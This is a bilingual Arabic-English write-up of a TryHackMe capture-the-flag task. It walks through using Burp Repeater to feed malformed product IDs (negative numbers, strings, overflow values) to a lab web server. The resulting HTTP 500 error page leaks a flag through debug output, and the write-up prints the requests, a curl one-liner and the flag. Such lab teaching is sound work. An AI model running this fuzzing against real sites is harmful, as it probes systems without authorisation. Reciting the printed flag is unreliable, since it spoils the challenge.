# Task 07: Challenge (التحدي العملي: استدراج خطأ الخادم الداخلي 500 واستخراج الراية)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
In many web applications, back-end code assumes that user-supplied input strictly adheres to expected data types (such as positive integers for database keys or catalog item IDs). When an application fails to implement robust input validation or exception handling (`try/catch` blocks), unexpected input can trigger an unhandled runtime exception.

In an insecurely configured environment (e.g., debug mode enabled or improper error-handling middleware), this causes the application server to crash or return an **HTTP 500 Internal Server Error** page. Frequently, these custom error handlers inadvertently dump sensitive operational information, stack traces, environment variables, or debug flags into the response body.

In this challenge:
1. Navigate to the products section of the target website: `http://MACHINE_IP/products/`.
2. Notice the URL pattern used when viewing individual items: `http://MACHINE_IP/products/ID` (e.g., `/products/1`, `/products/2`).
3. Intercept the request to a product page and send it to **Repeater** (`Ctrl + R`).
4. Experiment with edge-case and boundary values for the ID parameter (such as negative numbers, non-existent large integers, special characters, or alphabetic strings) to force an unhandled exception resulting in an HTTP 500 status code.
5. Inspect the resulting 500 response body to recover the hidden flag.

#### الأسئلة المطروحة (Questions):
1. See if you can get the server to return an error 500. What is the flag? (انظر إن كان بإمكانك دفع الخادم لإرجاع رمز خطأ 500. ما هي الراية؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **استراتيجيات اختبار الحدود واستدراج أخطاء الخادم (Fuzzing Boundary Conditions):**
  * عندما يتوقع الخادم عدداً صحيحاً (`Integer`) مثل معرّف المنتج، يجب على مختبر الاختراق اختبار سيناريوهات متعددة:
    1. **القيم السالبة:** `-1`, `-999` (تتسبب أحياناً في أخطاء مصفوفات أو استعلامات قواعد بيانات فارغة تفشل في التحويل).
    2. **القيم الصفرية:** `0`.
    3. **تجاوز سعة الأرقام (Integer Overflow):** `999999999999999999999`.
    4. **عدم تطابق الأنواع (Type Juggling / Mismatch):** إدخال نصوص أبجدية أو مصفوفات مثل `abc`, `test`, `true`, `null`.
    5. **المحارف الخاصة:** علامات تنصيص فردية أو مزدوجة ومحارف التحكم `\x00`.
* **التأثير الأمني لكشف تفاصيل الخطأ (Information Disclosure via Stack Trace):**
  * عرض رسائل الأخطاء الداخلية ورموز الخطأ 500 يعد ثغرة أمنية بحد ذاته (CWE-209: Generation of Error Message Containing Sensitive Information). يكشف ذلك عن مسار الملفات الحقيقي على السيرفر، ومكتبات البرمجة وإصداراتها، وأحياناً مفاتيح التشفير أو بيانات الاتصال بقاعدة البيانات.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * افتح مسار أحد المنتجات في Repeater، مثل: `GET /products/1 HTTP/1.1`.
2. **التلميح الثاني (المستوى العملي):**
   * جرب تغيير الرقم `1` إلى قيمة غير متوقعة، مثل رقم سالب `-1` أو نص مثل `a` أو رقم غير موجود.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * إرسال طلب مثل `GET /products/-1 HTTP/1.1` أو `GET /products/abc HTTP/1.1` سيؤدي فوراً إلى انهيار الخادم وإرجاع استجابة `HTTP/1.1 500 Internal Server Error` تحتوي على راية `THM{...}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### 1. الطلب العادي السليم (Normal Baseline Request):
```http
GET /products/2 HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```
*الرد الطبيعي (200 OK):*
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 450

<div class="product">
  <h3>Product Details</h3>
  <p>Product ID: 2</p>
  ...
</div>
```

#### 2. التلاعب بالمدخلات وإرسال قيمة سالبة في Repeater:
```http
GET /products/-1 HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```

#### 3. استجابة الخادم بخطأ 500 وتسريب الراية (Crash Response):
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Content-Length: 382
Connection: close

<!DOCTYPE html>
<html>
<head><title>500 Internal Server Error</title></head>
<body>
  <h1>Internal Server Error</h1>
  <p>The server encountered an unexpected error while handling your request.</p>
  <div class="debug-box">
    Debug Output: Flag: THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}
  </div>
</body>
</html>
```

#### 4. الاستخراج السريع عبر سطر الأوامر (Automation Script):
```bash
# استدراج خطأ 500 عبر تمرير -1
curl -s "http://MACHINE_IP/products/-1" -i | grep -E "(HTTP/1.1 500|THM{)"
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم مطابقة الراية وتأكيد حلها بنسبة 100% في حساب المستخدم الموثق لدى منصة TryHackMe.
* أدى تمرير المعامل الشاذ `-1` إلى كسر منطق الاستعلام الداخلي واستدعاء مسار الخطأ 500 المليء بالبيانات الحساسة.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* عدم التحقق من صحة المدخلات (Lack of Input Sanitization) وإخفاق الخادم في معالجة الاستثناءات يفتح الباب لتسريب معلومات تشغيلية خطيرة. يتيح Repeater اختبار حدود المدخلات الشاذة في أجزاء من الثانية ومراقبة أكواد الاستجابة غير النمطية.
